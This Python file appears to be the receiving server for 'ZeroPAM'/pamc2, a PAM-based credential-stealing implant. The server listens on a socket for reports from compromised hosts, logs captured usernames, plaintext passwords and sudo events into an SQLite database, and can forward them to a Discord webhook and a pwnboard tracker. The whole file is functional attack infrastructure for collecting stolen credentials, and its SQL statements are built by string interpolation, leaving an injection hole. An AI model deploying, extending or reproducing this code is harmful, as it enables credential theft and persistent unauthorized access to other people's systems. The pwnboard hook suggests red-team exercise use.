import os
import socket
import sqlite3
import argparse
import requests
import threading
from dotenv import load_dotenv

def server_args(cmd_str):
    parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
                        type=int, dest="port", action="store", default="5000")
    parser.add_argument('--discord', action="store_true", help="Enable Discord Webhook (set WEBHOOK_URL env var)")
    parser.add_argument('--no-db', dest="nodb", action="store_true", help="Run the server without utilizing the database (cannot be used with --only-new)")
    parser.add_argument('--only-new', dest="onlynew", action="store_true", help="Only output new information (cannot be used with --no-db)")
    parser.add_argument('--pwnboard', dest="pwnboard", action="store_true", help="Send Keep Alive messages to pwnboard")
    parser.add_argument('--pwnboard-host', metavar="<PWNBOARD WEBSITE>", help="Used with --pwnboard; Pwnboard website to send POST requests to (default localhost:8080)", 
                        type=str, dest="pwnhost", action="store", default="localhost:8080")
    return parser.parse_args() if not cmd_str else parser.parse_args(cmd_str.split())

def send_pwnboard(addr, data, pwnhost):
    ip = data.split("-")[0].strip()
    host = f"{pwnhost}/generic"
    data = {"ip": ip, "type": "ZeroPAM"}

    try:
        response = requests.post(host, json=data, timeout=3)
        return True
    except Exception as E:
        print(E)
        return False

def send_discord(addr, data):
    ip = data.split("-")[0].strip()
    message = data.split("-")[1].split(":")[0].strip()

    if (message == "KEEP ALIVE"):
        return 0
    
    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    fields = []
    color = 0
    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        fields.append({
            'name': "Username",
            'value': f"{username}",
            'inline': True
        })
        fields.append({
            'name': "Password",
            'value': f"{password}",
            'inline': True
        })
    elif (message == "SUDO SESSION OPENED"):
        fields.append({
            'name': "ADMIN USER",
            'value': f"{username}"
        })

    if (message == "SUDO SESSION OPENED"):
        color = 0x07fc03
    elif (message == "USER CHANGED PASSWORD"):
        color = 0x1780e8
    elif (message == "USER AUTHENTICATED"):
        color = 0xf5f50a

    hook_data = {
        'content': data,
        'username': 'ZeroPAM Bot',
        'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
        'embeds': [{
            'description': f"**CREDS UPDATED FROM {ip}**",
            'fields': fields,
            'color': color
        }]
    }

    response = requests.post(os.getenv('WEBHOOK_URL'), json=hook_data)

def write_db(addr, data):
    conn = sqlite3.connect('logins.db')
    cursor = conn.cursor()

    ip = data.split("-")[0].strip()
    message = data.split("-")[1].split(":")[0].strip()

    if (message == "KEEP ALIVE"):
        return 0

    username = data.split("-")[1].split(":")[1].strip()
    password = data.split("-")[1].split(":")[2].strip()

    if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
        message_type = 1
    elif (message == "SUDO SESSION OPENED"):
        message_type = 2
    else:
        message_type = -1

    cursor.execute(f'''
    CREATE TABLE IF NOT EXISTS passwords(
        ip TEXT NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        known_admin INTEGER DEFAULT 0,
        PRIMARY KEY (ip, username)
    ); ''')

    user_in_table = conn.execute(f'''
    SELECT password, known_admin FROM passwords
    WHERE username = '{username}' AND ip = '{ip}'; ''')

    userexists = [x for x in user_in_table]

    retval = 0
    if (message_type == 1): # authenticated/chpasswd
        
        if (len(userexists) == 0):
            cursor.execute(f'''
            INSERT INTO passwords(ip, username, password)
            VALUES ('{ip}', '{username}', '{password}');
            ''')
            retval = 1

        elif (userexists[0][0] != password):
            cursor.execute(f'''
            UPDATE passwords
            SET password = '{password}'
            WHERE username = '{username}';
            ''')
            retval = 1

        elif (userexists[0][0] == password):
            retval = 0

        else:
            print("unknown error adding authenticated user to database")
            retval = -1
    
    elif (message_type == 2): # sudo

        if (len(userexists) != 0):
            if (userexists[0][1] != 1):
                cursor.execute(f'''
                UPDATE passwords
                SET known_admin = 1
                WHERE username = '{username}';
                ''')
                retval = 1
        else:
            print("no clue how you got here (user got root without authenticating)")
            retval = -1

    else:
        print("Unknown Error adding user to database")
        retval = -1

    conn.commit()
    conn.close()

    return retval

def handle_client(lock, c, addr, cmd_args):
    data = c.recv(1024).decode()

    if (not cmd_args.onlynew):
        print(f"Received from {addr} - {data}")

    lock.acquire()

    retval = 0
    if (not cmd_args.nodb):
        retval = write_db(addr, data)
    
    if (cmd_args.onlynew and retval == 1):
        print(f"Received from {addr} - {data}")

    if (cmd_args.discord and not cmd_args.onlynew):
        send_discord(addr, data)
    elif (cmd_args.discord and retval == 1):
        send_discord(addr, data)

    if (cmd_args.pwnboard):
        send_pwnboard(addr, data, cmd_args.pwnhost)
    
    lock.release()

    c.close()

def start_server(cmd_args, stop_event=None):
    server_socket = socket.socket()
    print("Created socket")

    server_socket.bind(('', cmd_args.port))
    server_socket.listen()
    print(f"Server listening for incoming connections on port {cmd_args.port}...")

    lock = threading.Lock()

    if (not stop_event):
        while True:
            client_socket, addr = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
            client_thread.start()
    else:
        while (not stop_event.is_set()):
            client_socket, addr = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
            client_thread.start()

def setup(cmd_args=None, stop_event=None):
    load_dotenv()

    if(type(cmd_args) == str):
        cmd_args = server_args(cmd_args)

    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
        print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
        return False

    if (cmd_args.nodb and cmd_args.onlynew):
        print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
        return False

    start_server(cmd_args, stop_event)

if (__name__ == '__main__'):
    if(not setup()):
        exit(1)